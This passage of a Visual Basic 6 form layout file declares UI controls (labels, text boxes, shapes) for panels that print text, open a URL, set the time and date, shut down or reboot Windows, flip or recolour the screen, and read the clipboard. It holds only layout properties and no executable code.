         ScaleWidth      =   1455
         TabIndex        =   121
         Top             =   3600
         Width           =   1455
         Begin VB.Label lblprinttext 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "print text"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   122
            Top             =   45
            Width           =   1365
         End
         Begin VB.Shape Shape16 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1425
         End
      End
      Begin VB.TextBox txtsize 
         BackColor       =   &H00800000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   3120
         TabIndex        =   120
         Text            =   "15"
         Top             =   120
         Width           =   495
      End
      Begin VB.TextBox txtprint 
         BackColor       =   &H00800000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   2775
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   123
         Top             =   600
         Width           =   3735
      End
      Begin VB.Label Label13 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "font style:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   131
         Top             =   120
         Width           =   855
      End
      Begin VB.Label lblbold 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "b"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   1080
         TabIndex        =   130
         Top             =   120
         Width           =   255
      End
      Begin VB.Label lblitalic 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "i"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   1470
         TabIndex        =   129
         Top             =   120
         Width           =   255
      End
      Begin VB.Label lblunderline 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "u"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   1850
         TabIndex        =   128
         Top             =   115
         Width           =   255
      End
      Begin VB.Label lblstrike 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "s"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   -1  'True
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   2215
         TabIndex        =   127
         Top             =   125
         Width           =   255
      End
      Begin VB.Shape Shape36 
         BorderColor     =   &H00FF8080&
         Height          =   280
         Left            =   1050
         Top             =   90
         Width           =   310
      End
      Begin VB.Shape Shape35 
         BorderColor     =   &H00FF8080&
         Height          =   285
         Left            =   1440
         Top             =   90
         Width           =   315
      End
      Begin VB.Shape Shape34 
         BorderColor     =   &H00FF8080&
         Height          =   285
         Left            =   1810
         Top             =   90
         Width           =   315
      End
      Begin VB.Shape Shape17 
         BorderColor     =   &H00FF8080&
         Height          =   285
         Left            =   2185
         Top             =   90
         Width           =   315
      End
      Begin VB.Label lblup 
         BackColor       =   &H00000000&
         Caption         =   "£"
         BeginProperty Font 
            Name            =   "Wingdings 3"
            Size            =   9.75
            Charset         =   2
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF8080&
         Height          =   195
         Left            =   3720
         TabIndex        =   126
         Top             =   0
         Width           =   195
      End
      Begin VB.Label lbldown 
         BackColor       =   &H00000000&
         Caption         =   "¤"
         BeginProperty Font 
            Name            =   "Wingdings 3"
            Size            =   9.75
            Charset         =   2
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF8080&
         Height          =   195
         Left            =   3720
         TabIndex        =   125
         Top             =   240
         Width           =   195
      End
      Begin VB.Label Label9 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "size:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   2640
         TabIndex        =   124
         Top             =   120
         Width           =   375
      End
   End
   Begin VB.PictureBox picbrowser 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4695
      Left            =   1680
      ScaleHeight     =   4665
      ScaleWidth      =   3705
      TabIndex        =   114
      Top             =   720
      Visible         =   0   'False
      Width           =   3735
      Begin VB.TextBox txturl 
         BackColor       =   &H00FF8080&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   260
         Left            =   360
         TabIndex        =   117
         Top             =   1800
         Width           =   3015
      End
      Begin VB.PictureBox Picture38 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1080
         ScaleHeight     =   315
         ScaleWidth      =   1455
         TabIndex        =   115
         Top             =   2280
         Width           =   1455
         Begin VB.Label lblopenbrowser 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "open browser"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   116
            Top             =   45
            Width           =   1365
         End
         Begin VB.Shape Shape33 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1425
         End
      End
      Begin VB.Label Label23 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "url address"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   118
         Top             =   1440
         Width           =   1005
      End
      Begin VB.Line Line8 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   3555
         Y1              =   1680
         Y2              =   1680
      End
   End
   Begin VB.PictureBox pictime 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4575
      Left            =   1680
      ScaleHeight     =   4545
      ScaleWidth      =   3705
      TabIndex        =   138
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.TextBox txtdate 
         BackColor       =   &H00FF8080&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   260
         Left            =   240
         TabIndex        =   140
         Text            =   "13/08/2001"
         Top             =   1470
         Width           =   1200
      End
      Begin VB.TextBox txttime 
         BackColor       =   &H00FF8080&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   260
         Left            =   240
         TabIndex        =   139
         Text            =   "00:00"
         Top             =   630
         Width           =   840
      End
      Begin VB.Shape Shape26 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   1920
         Top             =   600
         Width           =   1425
      End
      Begin VB.Label lblsettime 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "set time"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   1950
         TabIndex        =   143
         Top             =   630
         Width           =   1365
      End
      Begin VB.Shape Shape25 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   1920
         Top             =   1440
         Width           =   1425
      End
      Begin VB.Label lblsetdate 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "set date"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   1950
         TabIndex        =   142
         Top             =   1470
         Width           =   1365
      End
      Begin VB.Shape Shape24 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   720
         Top             =   2520
         Width           =   2265
      End
      Begin VB.Label lblgettimedate 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "get current time and date"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   750
         TabIndex        =   141
         Top             =   2550
         Width           =   2205
      End
   End
   Begin VB.PictureBox picshutdown 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4575
      Left            =   1680
      ScaleHeight     =   4545
      ScaleWidth      =   3705
      TabIndex        =   132
      Top             =   720
      Visible         =   0   'False
      Width           =   3735
      Begin VB.Shape Shape23 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   600
         Top             =   480
         Width           =   2385
      End
      Begin VB.Label lblnormalshutdown 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "normal shutdown"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   630
         TabIndex        =   137
         Top             =   510
         Width           =   2325
      End
      Begin VB.Shape Shape22 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   600
         Top             =   1080
         Width           =   2385
      End
      Begin VB.Label lblforceshutdown 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "force windows shutdown"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   630
         TabIndex        =   136
         Top             =   1110
         Width           =   2325
      End
      Begin VB.Shape Shape21 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   600
         Top             =   1680
         Width           =   2385
      End
      Begin VB.Label lbllogoff 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "log off windows user"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   630
         TabIndex        =   135
         Top             =   1710
         Width           =   2325
      End
      Begin VB.Shape Shape20 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   600
         Top             =   2280
         Width           =   2385
      End
      Begin VB.Label lblpoweroff 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "shutdown and power off"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   630
         TabIndex        =   134
         Top             =   2310
         Width           =   2325
      End
      Begin VB.Shape Shape19 
         BorderColor     =   &H00FF8080&
         Height          =   300
         Left            =   600
         Top             =   2880
         Width           =   2385
      End
      Begin VB.Label lblreboot 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "reboot system"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   240
         Left            =   630
         TabIndex        =   133
         Top             =   2910
         Width           =   2325
      End
   End
   Begin VB.PictureBox picflipscreen 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4695
      Left            =   1680
      ScaleHeight     =   4665
      ScaleWidth      =   3705
      TabIndex        =   93
      Top             =   720
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox Picture41 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   320
         Left            =   1080
         ScaleHeight     =   315
         ScaleWidth      =   1455
         TabIndex        =   112
         Top             =   4200
         Width           =   1455
         Begin VB.Shape Shape40 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1425
         End
         Begin VB.Label lblflipscreen 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "flip screen"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   113
            Top             =   40
            Width           =   1365
         End
      End
      Begin VB.PictureBox Picture40 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   855
         Left            =   840
         Picture         =   "frmMain.frx":E2270
         ScaleHeight     =   855
         ScaleWidth      =   2040
         TabIndex        =   102
         Top             =   360
         Width           =   2040
      End
      Begin VB.PictureBox Picture39 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   855
         Left            =   840
         Picture         =   "frmMain.frx":E7D8A
         ScaleHeight     =   855
         ScaleWidth      =   2040
         TabIndex        =   101
         Top             =   1680
         Width           =   2040
      End
      Begin VB.PictureBox picbad 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   240
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   100
         Top             =   3840
         Width           =   255
         Begin VB.Shape optionbad 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   3  'Circle
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shpbad 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   3  'Circle
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.PictureBox picinvert 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   240
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   99
         Top             =   3600
         Width           =   255
         Begin VB.Shape optioninvert 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   3  'Circle
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shpinvert 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   3  'Circle
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.PictureBox picnormal 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   240
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   98
         Top             =   3360
         Width           =   255
         Begin VB.Shape optionnormal 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   3  'Circle
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shpnormal 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   3  'Circle
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.PictureBox picdarken 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1920
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   97
         Top             =   3360
         Width           =   255
         Begin VB.Shape optiondark 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   3  'Circle
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shpdark 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   3  'Circle
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.PictureBox picbrighten 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1920
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   96
         Top             =   3600
         Width           =   255
         Begin VB.Shape optionbright 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   3  'Circle
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shpbright 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   3  'Circle
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.PictureBox picvertical 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1200
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   95
         Top             =   1320
         Width           =   255
         Begin VB.Shape checkvertical 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   1  'Square
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shpvertical 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   1  'Square
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.PictureBox pichorizontal 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1200
         ScaleHeight     =   165
         ScaleWidth      =   225
         TabIndex        =   94
         Top             =   2640
         Width           =   255
         Begin VB.Shape checkhorizontal 
            FillColor       =   &H00FF8080&
            FillStyle       =   0  'Solid
            Height          =   100
            Left            =   40
            Shape           =   1  'Square
            Top             =   30
            Visible         =   0   'False
            Width           =   135
         End
         Begin VB.Shape shphorizontal 
            BackColor       =   &H00000000&
            BorderColor     =   &H00808080&
            FillStyle       =   0  'Solid
            Height          =   165
            Left            =   0
            Shape           =   1  'Square
            Top             =   0
            Width           =   225
         End
      End
      Begin VB.Label Label20 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "flip screen options"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   111
         Top             =   0
         Width           =   1605
      End
      Begin VB.Line Line7 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   3555
         Y1              =   240
         Y2              =   240
      End
      Begin VB.Label Label8 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "colour options"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   110
         Top             =   3000
         Width           =   1245
      End
      Begin VB.Line Line6 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   3555
         Y1              =   3240
         Y2              =   3240
      End
      Begin VB.Label lblnormal 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "normal screen"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   480
         TabIndex        =   109
         Top             =   3360
         Width           =   1365
      End
      Begin VB.Label lblinvert 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "invert colours"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   480
         TabIndex        =   108
         Top             =   3600
         Width           =   1245
      End
      Begin VB.Label lblbad 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "bad colours"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   480
         TabIndex        =   107
         Top             =   3840
         Width           =   1125
      End
      Begin VB.Label lbldark 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "darken screen"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   2160
         TabIndex        =   106
         Top             =   3360
         Width           =   1275
      End
      Begin VB.Label lblbright 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "brighten screen"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   2160
         TabIndex        =   105
         Top             =   3600
         Width           =   1380
      End
      Begin VB.Label lblvertical 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "flip screen vertically"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   1440
         TabIndex        =   104
         Top             =   1320
         Width           =   1725
      End
      Begin VB.Label lblhorizontal 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "flip screen horizontally"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   1440
         TabIndex        =   103
         Top             =   2640
         Width           =   1965
      End
   End
   Begin VB.PictureBox picclipboard 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4575
      Left            =   1680
      ScaleHeight     =   4545
      ScaleWidth      =   3705
      TabIndex        =   78
      Top             =   720
      Visible         =   0   'False
      Width           =   3735
      Begin VB.TextBox txtclipboard 
         Appearance      =   0  'Flat
         BackColor       =   &H00800000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   2655
         Left            =   375
         MultiLine       =   -1  'True
         TabIndex        =   85
         Top             =   360
         Width           =   3195
      End
      Begin VB.PictureBox Picture37 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   360
         ScaleHeight     =   315
         ScaleWidth      =   1545
         TabIndex        =   83
         Top             =   3120
         Width           =   1545
         Begin VB.Label lblreadclip 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "read clipboard text"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   84
            Top             =   45
            Width           =   1470
         End
         Begin VB.Shape Shape30 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1515
         End
      End
